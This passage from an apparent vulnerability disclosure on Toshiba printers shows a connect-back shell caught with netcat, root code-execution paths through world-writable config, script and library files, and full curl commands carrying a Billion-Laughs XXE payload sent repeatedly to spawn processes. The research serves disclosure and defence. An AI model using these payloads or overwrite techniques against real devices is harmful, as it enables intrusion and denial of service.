<p>Due to some reverse proxy rules and check before this API can be reached, this Python code is reachable using the API path <code>http://printerip/tapy/server/appmgmt/applistDeployed</code> with a cookie previously provided by the printer when visiting http://printerip/ (without authentication).</p>
<p>When sending a HTTP request to <code>http://printerip/tapy/server/appmgmt/applistDeployed</code>, the attacker will receive a connect-back shell from the printer:</p>
<pre><code>kali# nc -l -v -p 21
listening on [any] 21 ...
10.0.0.1: inverse host lookup failed: Unknown host 
connect to [10.0.0.2] from (UNKNOWN) [10.0.0.1] 37243
[apache@MFP14144292 /]$ id
uid=1000(apache) gid=2000(trusted) groups=2000(trusted)
[apache@MFP14144292 /]$ uname -ap
Linux MFP14144292 3.10.38-ltsi-WR6.0.0.11_standard #3513 SMP Tue Jul 5 09:58:22 IST 2022 i686 GNU/Linux
[apache@MFP14144292 /]$
</code></pre>
<p>Connect-back shell as apache:</p>
<p><img alt="" src="images/2024-toshiba-connect-back-shell-apache.png" /></p>
<p><a id="pre-auth-rce-upload-wsgi-ini"></a></p>
<h3>Remote Code Execution - Upload of a new .ini configuration files inside WSGI Python programs</h3>
<p>It is possible to overwrite the .ini configuration file used by WSGI Python programs. This technique is public as of 2023-02-28: <a href="https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html">https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html</a>.</p>
<p>Apache is running with WSGI configurations:</p>
<pre><code>bash-4.1# ps auxww | grep apache
apache    1611  0.0  0.1 1264444 3708 ?        Sl   10:37   0:00 /usr/local/ebx/httpd_worker/bin/httpd_worker -f /encryption/al/network/config/httpd-prox.conf -k start
apache    1822  0.2  3.6 483056 108852 ?       Sl   10:37   1:02 (wsgi:webpanel)                              -f /encryption/al/network/config/httpd-wsgi.conf -k start
apache    1823  0.0  2.1 270952 64172 ?        Sl   10:37   0:05 (wsgi:topaccesspy)                           -f /encryption/al/network/config/httpd-wsgi.conf -k start
apache    1824  0.0  0.1 285148  4452 ?        Sl   10:37   0:00 /usr/local/ebx/httpd_worker/bin/httpd_worker -f /encryption/al/network/config/httpd-wsgi.conf -k start
</code></pre>
<p>The Python scripts running as WSGI are configured with specific .ini configuration files:</p>
<ul>
<li><code>/registration/al/WebPanel/development.ini</code></li>
<li><code>/registration/al/TopAccessPy/development.ini</code></li>
</ul>
<p>Unfortunately, these configuration files can be rewritten because of insecure permissions, allowing a remote attacker to execute commands, as described in recent public research.</p>
<p>These files have insecure permissions as shown below:</p>
<pre><code>bash-4.1# ls -la /registration/al/WebPanel/
total 2632
drwxrwxrwx  7 root root    4096 Dec  6 03:33 .
drwxrwxrwx 19 root root    4096 Mar 14 16:28 ..
-rwxrwxrwx  1 root root 2642944 Dec  6 03:33 HomeBackgroundImages.tar.gz
-rwxrwxrwx  1 root root     857 Dec  6 03:33 Makefile
-rwxrwxrwx  1 root root     909 Dec  6 03:33 config.rb
-rwxrwxrwx  1 root root    1103 Dec  6 03:33 development.ini
drwxrwxrwx  4 root root    4096 Jan 22  2015 predefinedxml
-rwxrwxrwx  1 root root     199 Dec  6 03:33 pyramid.wsgi
drwxrwxrwx  3 root root    4096 Dec  6 03:33 statuspages
drwxrwxrwx 14 root root    4096 Dec  6 03:33 wpclient
drwxrwxrwx  6 root root    4096 Mar 14 16:32 wpserver
drwxrwxrwx  2 root root    4096 Dec  6 03:33 wpserver.egg-info
bash-4.1# ls -la /registration/al/WebPanel/development.ini
-rwxrwxrwx 1 root root 1103 Dec  6 03:33 /registration/al/WebPanel/development.ini

bash-4.1# ls -la /registration/al/TopAccessPy
total 36
drwxrwxrwx  5 root root 4096 Dec  6 03:39 .
drwxrwxrwx 19 root root 4096 Mar 14 16:28 ..
-rwxrwxrwx  1 root root  315 Dec  6 03:39 Makefile
-rwxrwxrwx  1 root root 2091 Dec  6 03:39 TA_CacheScript.sh
drwxrwxrwx  7 root root 4096 Mar 23 10:37 client
-rwxrwxrwx  1 root root 1078 Dec  6 03:39 development.ini
-rwxrwxrwx  1 root root  202 Dec  6 03:39 pyramid.wsgi
drwxrwxrwx  6 root root 4096 Mar 14 16:32 server
drwxrwxrwx  2 root root 4096 Dec  6 03:39 server.egg-info
bash-4.1# ls -la /registration/al/TopAccessPy/development.ini
-rwxrwxrwx 1 root root 1078 Dec  6 03:39 /registration/al/TopAccessPy/development.ini
</code></pre>
<p>These scripts can be overwritten to include specific commands to be executed:</p>
<p>Content of <code>/registration/al/TopAccessPy/development.ini</code>:</p>
<pre><code>bash-4.1# cat /registration/al/TopAccessPy/development.ini
[app:main]
use = egg:server

pyramid.reload_templates = true
pyramid.debug_authorization = false
pyramid.debug_notfound = false
pyramid.debug_routematch = false
pyramid.default_locale_name = en
pyramid.includes = pyramid_tm

[server:main]

# Begin logging configuration

[loggers]
keys = root, server

[handlers]
keys = console, serverhandler

[formatters]
keys = generic, serverformatter

[logger_root]
level = DEBUG
handlers = console

[logger_server]
level=DEBUG
handlers=serverhandler
qualname=server
propagate=0

[handler_console]
class = StreamHandler
args = (sys.stderr,)
level = NOTSET
formatter = generic

[handler_serverhandler]
class=logging.handlers.RotatingFileHandler
level=DEBUG
formatter=serverformatter
args=('/work/log/al/webpanel/python_ta.log','a',(5*1024*1024),3)

[formatter_generic]
format = %(asctime)s %(levelname)-5.5s [%(name)s][%(threadName)s] %(message)s

[formatter_serverformatter]
format=%(asctime)s%(msecs)03d Pid= %(process)d Tid= %(thread)d %(filename)s     %(lineno)d %(levelname)s %(message)s
datefmt=%m/%d %H:%M:%S

# End logging configuration
</code></pre>
<p><a id="pre-auth-rce-upload-gdb"></a></p>
<h3>Remote Code Execution - Upload of a malicious script <code>/tmp/backtraceScript.sh</code> and injection of malicious gdb commands</h3>
<p>When a program crashes, the <code>/tmp/backtraceScript.sh</code> script will be executed as root as shown below:</p>
<pre><code>2023/05/27 19:48:02 CMD: UID=0     PID=22535  | sh -c /tmp/backtraceScript.sh "/work/log/corefiles/core.httpd_worker.8272.MFP14130119.1681135080" &gt; "/work/log/corefiles/core.httpd_worker.8272.MFP14130119.1681135080"_backtrace 
2023/05/27 19:48:02 CMD: UID=0     PID=22536  | /bin/bash /tmp/backtraceScript.sh /work/log/corefiles/core.httpd_worker.8272.MFP14130119.1681135080 
2023/05/27 19:48:02 CMD: UID=0     PID=22540  | /bin/bash /tmp/backtraceScript.sh /work/log/corefiles/core.httpd_worker.8272.MFP14130119.1681135080 
2023/05/27 19:48:02 CMD: UID=0     PID=22539  | /bin/bash /tmp/backtraceScript.sh /work/log/corefiles/core.httpd_worker.8272.MFP14130119.1681135080 
2023/05/27 19:48:02 CMD: UID=0     PID=22538  | /bin/bash /tmp/backtraceScript.sh /work/log/corefiles/core.httpd_worker.8272.MFP14130119.1681135080 
2023/05/27 19:48:02 CMD: UID=0     PID=22537  | /bin/bash /tmp/backtraceScript.sh /work/log/corefiles/core.httpd_worker.8272.MFP14130119.1681135080 
2023/05/27 19:48:03 CMD: UID=0     PID=22541  | gdb -c /work/log/corefiles/core.httpd_worker.8272.MFP14130119.1681135080 -x /tmp/gdb_commands.txt 
2023/05/27 19:48:03 CMD: UID=0     PID=22542  | gdb /usr/local/ebx/httpd_worker/bin/httpd_worker /work/log/corefiles/core.httpd_worker.8272.MFP14130119.1681135080 --batch --command=/tmp/gdb_commands.txt 
2023/05/27 19:48:03 CMD: UID=0     PID=22543  | iconv -l
</code></pre>
<p>This script has insecure permissions (777) and will run gdb as root:</p>
<p>Content of <code>/tmp/backtraceScript.sh</code>:</p>
<pre><code>bash-4.1# ls -la /tmp/backtraceScript.sh
-rwxrwxrwx 1 root root 1457 Apr  6  2016 /tmp/backtraceScript.sh
bash-4.1# cat /tmp/backtraceScript.sh
#!/bin/bash
OIFS=${IFS}
IFS=$'\n'
echo "quit" &gt; /tmp/gdb_commands.txt
echo "quit" &gt;&gt; /tmp/gdb_commands.txt
EXE_NAME=`gdb -c "$1" -x /tmp/gdb_commands.txt | grep "Core was generated by" | cut -d'\`' -f2 | cut -d' ' -f1`
echo "thread apply all backtrace full" &gt; /tmp/gdb_commands.txt
echo "set print asm" &gt;&gt; /tmp/gdb_commands.txt
echo "set print demangle on" &gt;&gt; /tmp/gdb_commands.txt
echo "disassemble" &gt;&gt; /tmp/gdb_commands.txt
echo "info reg" &gt;&gt; /tmp/gdb_commands.txt
echo "quit" &gt;&gt; /tmp/gdb_commands.txt
echo "quit" &gt;&gt; /tmp/gdb_commands.txt
if [ "$EXE_NAME" = ""  ];then
if [ -d /work/log/platform/syscallerr/core_files ];then
mv "$1" /work/log/platform/syscallerr/core_files/
else
mkdir -p /work/log/platform/syscallerr/core_files
mv "$1" /work/log/platform/syscallerr/core_files/
fi
else
if [ -f $EXE_NAME  ];then
gdb $EXE_NAME "$1" --batch --command=/tmp/gdb_commands.txt 2&gt;&amp;1
elif [ -f $EB2/bin/$EXE_NAME ]; then
gdb $EB2/bin/$EXE_NAME "$1" --batch --command=/tmp/gdb_commands.txt 2&gt;&amp;1
elif [ "$EXE_NAME"="(wsgi:webapi)" -o "$EXE_NAME"="(wsgi:webpanel)" -o "$EXE_NAME"="(wsgi:topaccesspy)" ]; then
EXE_NAME=/usr/local/ebx/httpd_worker/bin/httpd_worker
gdb $EXE_NAME "$1" --batch --command=/tmp/gdb_commands.txt 2&gt;&amp;1
else
if [ -d /work/log/platform/syscallerr/core_files ];then
mv "$1" /work/log/platform/syscallerr/core_files/
else
mkdir -p /work/log/platform/syscallerr/core_files
mv "$1" /work/log/platform/syscallerr/core_files/
fi
fi
fi
IFS=${OIFS}
bash-4.1#
</code></pre>
<p>The <code>/tmp/gdb_commands.txt</code> gdb script (used by gdb in the <code>/tmp/backtraceScript.sh</code> script) can be also overwritten by an attacker to contain gdb commands and get Remote Code Execution.</p>
<p>An attacker can change the <code>/tmp/backtraceScript.sh</code> to get Remote Code Execution.</p>
<p>An attacker can change the <code>/tmp/gdb_commands.txt</code> script to get Remote Code Execution.</p>
<p><a id="pre-auth-rce-upload-sapphost"></a></p>
<h3>Remote Code Execution - Upload of a malicious <code>/home/SYSROM_SRC/build/common/bin/sapphost.py</code> program</h3>
<p>The program <code>/home/SYSROM_SRC/build/release/bin/sapphost.py</code> runs as root when the printer starts:</p>
<pre><code>bash-4.1# ps auxww|grep python
root      3984  5.0  5.3 200160 70944 ?        Sl   18:49   0:03 python /home/SYSROM_SRC/build/release/bin/sapphost.py 10000000-0000-0000-0000-500000000000
root      4597  4.5  3.5 144312 47740 ?        Sl   18:49   0:02 python /home/SYSROM_SRC/build/release/bin/sapphost.py 10000000-0000-0000-0000-500000000001
root      5193  0.0  0.1  12616  1852 ?        S    18:50   0:00 grep python
bash-4.1#
</code></pre>
<p><code>/home/SYSROM_SRC/build/release/bin/sapphost.py</code> is a symbolic link to <code>/home/SYSROM_SRC/build/common/bin/sapphost.py</code> and this Python program has insecure permissions, allowing any local user or any remote attacker leveraging the insecure file upload vulnerability to overwrite it: </p>
<pre>
bash-4.1# ls -la /home/SYSROM_SRC/build/release/bin/sapphost.py
lrwxrwxrwx 1 root root 32 Mar 15 11:44 /home/SYSROM_SRC/build/release/bin/sapphost.py -> ../../thirdparty/bin/sapphost.py
bash-4.1# ls -la /home/SYSROM_SRC/build/thirdparty/bin/sapphost.py
lrwxrwxrwx 1 root root 28 Mar 15 11:44 /home/SYSROM_SRC/build/thirdparty/bin/sapphost.py -> ../../common/bin/sapphost.py
bash-4.1# ls -la /home/SYSROM_SRC/build/common/bin/sapphost.py
<font color=red>-rwxrwxrwx 1 root root 2124 Oct 12  2021 /home/SYSROM_SRC/build/common/bin/sapphost.py</font>
</pre>

<p>An attacker can overwrite this Python code to get Remote Code Execution when the printer starts.</p>
<p><a id="pre-auth-rce-libs"></a></p>
<h3>Remote Code Execution - Upload of malicious libraries</h3>
<p>When analyzing the processes running in the printers, it appears the <code>LD_PRELOAD</code> variable is used to load specific shared libraries:</p>
<ul>
<li><code>/ramdisk/al/libGetNameInfoInterface.so</code></li>
<li><code>/ramdisk/al/libGetAddtInfoInterface.so</code></li>
</ul>
<p>We can find the <code>LD_PRELOAD</code> variable set by default in programs running in the printers:</p>
<pre><code>bash-4.1# printenv | grep LD_PRELO
LD_PRELOAD=/ramdisk/al/libGetNameInfoInterface.so:/ramdisk/al/libGetAddtInfoInterface.so:
bash-4.1# ls -la /ramdisk/al/libGetNameInfoInterface.so
-rwxrwxrwx 1 root root 70813 Dec  6 02:02 /ramdisk/al/libGetNameInfoInterface.so
bash-4.1# s -la /ramdisk/al/libGetAddtInfoInterface.so
-rwxrwxrwx 1 root root 87311 Dec  6 02:02 /ramdisk/al/libGetAddtInfoInterface.so
bash-4.1#
</code></pre>
<p>For example, when sending 55 HTTP requests to the printers, new Apache processes running as root will be created on the fly by the printer, as shown below. These new processes will load and execute code from <code>libGetNameInfoInterface.so</code> and <code>libGetAddtInfoInterface.so</code>. An attacker can rewrite any file over them to get Remote Code Execution.</p>
<p>Using the HTTP request from the <a href="#pre-auth-xxe-dos">Pre-authenticated Blind XML External Entity (XXE) injection - DoS</a>, we will send 55 HTTP requests (only the last 3 are displayed) containing the Billion-Laugh Attack, to create new Apache processes in the remote printer:</p>
<pre><code>kali% curl -i -s -k -X $'POST' \
    -H $'Host: 10.0.0.1:8080' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Cache-Control: no-cache' -H $'Pragma: no-cache' -H $'Content-Type: text/plain; charset=utf-8' -H $'csrfpId: 10.0.0.1.852d519a6fa9825fae857bac5c003da0' -H $'Content-Length: 760' -H $'Origin: http://10.0.0.1:8080' -H $'Connection: close' -H $'Referer: http://10.0.0.1:8080/?MAIN=TOPACCESS' \
    -b $'Session=10.0.0.2.852d519a6fa9825fae857bac5c003da0; Locale=en-US,en#q=0.5; BrowserLang=en_US; pageTrack=MAIN%3DLOGS%26SUB%3DJOBLOGS%26CAT%3DPRINT' \
    --data-binary $'&lt;!DOCTYPE lolz [\x0d\x0a &lt;!ENTITY lol \"lol\"&gt;\x0d\x0a &lt;!ELEMENT lolz (#PCDATA)&gt;\x0d\x0a &lt;!ENTITY lol1 \"&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;\"&gt;\x0d\x0a &lt;!ENTITY lol2 \"&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;\"&gt;\x0d\x0a &lt;!ENTITY lol3 \"&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;\"&gt;\x0d\x0a &lt;!ENTITY lol4 \"&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;\"&gt;\x0d\x0a &lt;!ENTITY lol5 \"&amp;lol4;&amp;lol4;&amp;lol4;\"&gt;\x0d\x0a &lt;!ENTITY lol6 \"&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;\"&gt;\x0d\x0a &lt;!ENTITY lol7 \"&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;\"&gt;\x0d\x0a &lt;!ENTITY lol8 \"&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;\"&gt;\x0d\x0a &lt;!ENTITY lol9 \"&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;\"&gt;\x0d\x0a]&gt;\x0d\x0a&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;' \
    $'http://10.0.0.1:8080/contentwebserver' &amp;
[53] 2286190

kali% curl -i -s -k -X $'POST' \
    -H $'Host: 10.0.0.1:8080' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Cache-Control: no-cache' -H $'Pragma: no-cache' -H $'Content-Type: text/plain; charset=utf-8' -H $'csrfpId: 10.0.0.1.852d519a6fa9825fae857bac5c003da0' -H $'Content-Length: 760' -H $'Origin: http://10.0.0.1:8080' -H $'Connection: close' -H $'Referer: http://10.0.0.1:8080/?MAIN=TOPACCESS' \
    -b $'Session=10.0.0.2.852d519a6fa9825fae857bac5c003da0; Locale=en-US,en#q=0.5; BrowserLang=en_US; pageTrack=MAIN%3DLOGS%26SUB%3DJOBLOGS%26CAT%3DPRINT' \
    --data-binary $'&lt;!DOCTYPE lolz [\x0d\x0a &lt;!ENTITY lol \"lol\"&gt;\x0d\x0a &lt;!ELEMENT lolz (#PCDATA)&gt;\x0d\x0a &lt;!ENTITY lol1 \"&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;\"&gt;\x0d\x0a &lt;!ENTITY lol2 \"&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;\"&gt;\x0d\x0a &lt;!ENTITY lol3 \"&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;\"&gt;\x0d\x0a &lt;!ENTITY lol4 \"&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;\"&gt;\x0d\x0a &lt;!ENTITY lol5 \"&amp;lol4;&amp;lol4;&amp;lol4;\"&gt;\x0d\x0a &lt;!ENTITY lol6 \"&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;\"&gt;\x0d\x0a &lt;!ENTITY lol7 \"&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;\"&gt;\x0d\x0a &lt;!ENTITY lol8 \"&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;\"&gt;\x0d\x0a &lt;!ENTITY lol9 \"&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;\"&gt;\x0d\x0a]&gt;\x0d\x0a&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;' \
    $'http://10.0.0.1:8080/contentwebserver' &amp;
[54] 2286192

kali% curl -i -s -k -X $'POST' \
    -H $'Host: 10.0.0.1:8080' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Cache-Control: no-cache' -H $'Pragma: no-cache' -H $'Content-Type: text/plain; charset=utf-8' -H $'csrfpId: 10.0.0.1.852d519a6fa9825fae857bac5c003da0' -H $'Content-Length: 760' -H $'Origin: http://10.0.0.1:8080' -H $'Connection: close' -H $'Referer: http://10.0.0.1:8080/?MAIN=TOPACCESS' \
    -b $'Session=10.0.0.2.852d519a6fa9825fae857bac5c003da0; Locale=en-US,en#q=0.5; BrowserLang=en_US; pageTrack=MAIN%3DLOGS%26SUB%3DJOBLOGS%26CAT%3DPRINT' \
    --data-binary $'&lt;!DOCTYPE lolz [\x0d\x0a &lt;!ENTITY lol \"lol\"&gt;\x0d\x0a &lt;!ELEMENT lolz (#PCDATA)&gt;\x0d\x0a &lt;!ENTITY lol1 \"&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;\"&gt;\x0d\x0a &lt;!ENTITY lol2 \"&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;\"&gt;\x0d\x0a &lt;!ENTITY lol3 \"&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;\"&gt;\x0d\x0a &lt;!ENTITY lol4 \"&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;\"&gt;\x0d\x0a &lt;!ENTITY lol5 \"&amp;lol4;&amp;lol4;&amp;lol4;\"&gt;\x0d\x0a &lt;!ENTITY lol6 \"&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;\"&gt;\x0d\x0a &lt;!ENTITY lol7 \"&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;\"&gt;\x0d\x0a &lt;!ENTITY lol8 \"&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;\"&gt;\x0d\x0a &lt;!ENTITY lol9 \"&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;\"&gt;\x0d\x0a]&gt;\x0d\x0a&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;' \
    $'http://10.0.0.1:8080/contentwebserver' &amp;
[55] 2286194
</code></pre>
<p>We can find that new Apache processes are created using <code>LD_PRELOAD</code> variables on the remote printer:</p>
<pre><code>2023/05/27 11:31:42 CMD: UID=0     PID=4132   | /usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
2023/05/27 11:31:42 CMD: UID=0     PID=4131   | /usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
2023/05/27 11:31:42 CMD: UID=0     PID=4130   | /usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
2023/05/27 11:31:42 CMD: UID=0     PID=4129   | /usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
2023/05/27 11:31:43 CMD: UID=0     PID=4138   | /usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
2023/05/27 11:31:43 CMD: UID=0     PID=4137   | /usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
2023/05/27 11:31:43 CMD: UID=0     PID=4136   | /usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
2023/05/27 11:31:43 CMD: UID=0     PID=4135   | /usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
2023/05/27 11:31:43 CMD: UID=0     PID=4134   | /usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
2023/05/27 11:31:43 CMD: UID=0     PID=4133   | /usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
2023/05/27 11:31:43 CMD: UID=0     PID=4139   | /usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
2023/05/27 11:31:43 CMD: UID=0     PID=4140   | /usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
2023/05/27 11:31:44 CMD: UID=0     PID=4141   | watch -n 3 -t if [ -e /root/sshd_start.sh ]; then dos2unix /root/sshd_start.sh &amp;&amp; chmod +x /root/sshd_start.sh &amp;&amp; /root/sshd_start.sh &amp;&amp; rm /root/sshd_start.sh || rm /root/sshd_start.sh; fi
2023/05/27 11:31:44 CMD: UID=0     PID=4142   | watch -n 3 -t if [ -e /root/sshd_start.sh ]; then dos2unix /root/sshd_start.sh &amp;&amp; chmod +x /root/sshd_start.sh &amp;&amp; /root/sshd_start.sh &amp;&amp; rm /root/sshd_start.sh || rm /root/sshd_start.sh; fi
2023/05/27 11:31:45 CMD: UID=0     PID=4143   | /usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
2023/05/27 11:31:46 CMD: UID=0     PID=4145   | /usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
2023/05/27 11:31:46 CMD: UID=0     PID=4144   | /usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
2023/05/27 11:31:47 CMD: UID=0     PID=4146   | watch -n 3 -t if [ -e /root/sshd_start.sh ]; then dos2unix /root/sshd_start.sh &amp;&amp; chmod +x /root/sshd_start.sh &amp;&amp; /root/sshd_start.sh &amp;&amp; rm /root/sshd_start.sh || rm /root/sshd_start.sh; fi
2023/05/27 11:31:47 CMD: UID=0     PID=4147   | watch -n 3 -t if [ -e /root/sshd_start.sh ]; then dos2unix /root/sshd_start.sh &amp;&amp; chmod +x /root/sshd_start.sh &amp;&amp; /root/sshd_start.sh &amp;&amp; rm /root/sshd_start.sh || rm /root/sshd_start.sh; fi
2023/05/27 11:31:47 CMD: UID=0     PID=4151   | /usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
2023/05/27 11:31:47 CMD: UID=0     PID=4150   | /usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
2023/05/27 11:31:47 CMD: UID=0     PID=4149   | /usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
2023/05/27 11:31:47 CMD: UID=0     PID=4148   | /usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
2023/05/27 11:31:48 CMD: UID=0     PID=4156   | /usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
2023/05/27 11:31:48 CMD: UID=0     PID=4155   | /usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
2023/05/27 11:31:48 CMD: UID=0     PID=4154   | /usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
2023/05/27 11:31:48 CMD: UID=0     PID=4153   | /usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
2023/05/27 11:31:48 CMD: UID=0     PID=4152   | /usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
2023/05/27 11:31:48 CMD: UID=0     PID=4158   | /usr/local/ebx/bin/httpd -f /encryption/al/network/config/httpd.conf -k start
</code></pre>
<p>We can analyze a newly-created Apache process. For example, the Apache process with the PID 4129 will have some libraries loaded in order to execute code implemented in these libraries:</p>
<pre><code>bash-4.1# cat /proc/4129/maps
08048000-080bb000 r-xp 00000000 08:02 155908     /home/SYSROM_SRC/build/thirdparty/bin/httpd
080bb000-080bf000 rw-p 00072000 08:02 155908     /home/SYSROM_SRC/build/thirdparty/bin/httpd
080bf000-0833e000 rw-p 00000000 00:00 0          [heap]
0833e000-08360000 rw-p 00000000 00:00 0          [heap]
08360000-083e8000 rw-p 00000000 00:00 0          [heap]
4bc47000-4bc63000 r-xp 00000000 08:02 11770      /lib/ld-2.11.3.so
4bc63000-4bc64000 r--p 0001b000 08:02 11770      /lib/ld-2.11.3.so
4bc64000-4bc65000 rw-p 0001c000 08:02 11770      /lib/ld-2.11.3.so
4bc67000-4bda6000 r-xp 00000000 08:02 11750      /lib/libc-2.11.3.so
4bda6000-4bda7000 ---p 0013f000 08:02 11750      /lib/libc-2.11.3.so
4bda7000-4bda9000 r--p 0013f000 08:02 11750      /lib/libc-2.11.3.so
4bda9000-4bdaa000 rw-p 00141000 08:02 11750      /lib/libc-2.11.3.so
4bdaa000-4bdad000 rw-p 00000000 00:00 0
4bdaf000-4bdb1000 r-xp 00000000 08:02 11665      /lib/libdl-2.11.3.so
4bdb1000-4bdb2000 r--p 00001000 08:02 11665      /lib/libdl-2.11.3.so
4bdb2000-4bdb3000 rw-p 00002000 08:02 11665      /lib/libdl-2.11.3.so
4bdbf000-4bddf000 r-xp 00000000 08:02 139743     /usr/lib/libpcre.so.3.12.1
4bddf000-4bde0000 rw-p 0001f000 08:02 139743     /usr/lib/libpcre.so.3.12.1
4bdee000-4bdf0000 r-xp 00000000 08:02 144969     /usr/lib/libcom_err.so.2.1
4bdf0000-4bdf1000 rw-p 00001000 08:02 144969     /usr/lib/libcom_err.so.2.1
4bdfa000-4be0c000 r-xp 00000000 08:02 145525     /usr/lib/libz.so.1.2.3
4be0c000-4be0d000 rw-p 00011000 08:02 145525     /usr/lib/libz.so.1.2.3
4be0f000-4be12000 r-xp 00000000 08:02 144902     /usr/lib/libuuid.so.1.3.0
4be12000-4be13000 rw-p 00002000 08:02 144902     /usr/lib/libuuid.so.1.3.0
4be15000-4be1c000 r-xp 00000000 08:02 11732      /lib/librt-2.11.3.so
4be1c000-4be1d000 r--p 00006000 08:02 11732      /lib/librt-2.11.3.so
4be1d000-4be1e000 rw-p 00007000 08:02 11732      /lib/librt-2.11.3.so
4be7e000-4be9f000 r-xp 00000000 08:02 142900     /usr/lib/libk5crypto.so.3.1
